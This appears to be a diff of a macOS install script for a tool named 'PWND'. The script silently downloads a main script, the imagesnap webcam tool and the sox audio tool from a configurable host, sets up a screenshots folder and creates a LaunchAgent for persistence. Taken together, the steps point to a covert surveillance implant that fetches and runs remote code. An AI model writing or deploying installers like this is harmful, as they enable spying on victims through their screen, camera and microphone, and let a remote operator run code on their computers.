@@ -20,6 +20,12 @@ mkdir -p ~/.pwnd/screenshots
 echo $HOST > ~/.pwnd/host
 echo "// Done"
 
+echo "=> Downloading main PWND script..."
+curl -L -s -o ~/.pwnd/main.sh "${HOST}/main.sh" > /dev/null
+
+chmod +x ~/.pwnd/main.sh
+echo "// Done"
+
 echo "=> Downloading imagesnap..."
 curl -L -s -o ~/.pwnd/imagesnap.tgz "${HOST}/imagesnap.tgz" > /dev/null
 
@@ -27,12 +33,10 @@ mkdir -p ~/.pwnd/imagesnap
 tar xfz ~/.pwnd/imagesnap.tgz -C ~/.pwnd/imagesnap --strip-components 1
 echo "// Done"
 
-mkdir -p ~/.pwnd/pictures
-
-echo "=> Downloading main PWND script..."
-curl -L -s -o ~/.pwnd/main.sh "${HOST}/main.sh" > /dev/null
-
-chmod +x ~/.pwnd/main.sh
+echo "=> Downloading sox..."
+curl -L -s -o ~/.pwnd/sox.zip "${HOST}/sox.zip" > /dev/null
+unzip ~/.pwnd/sox.zip -d ~/.pwnd
+mv ~/.pwnd/sox-* ~/.pwnd/sox
 echo "// Done"
 
 echo "=> Creating LaunchAgent..."
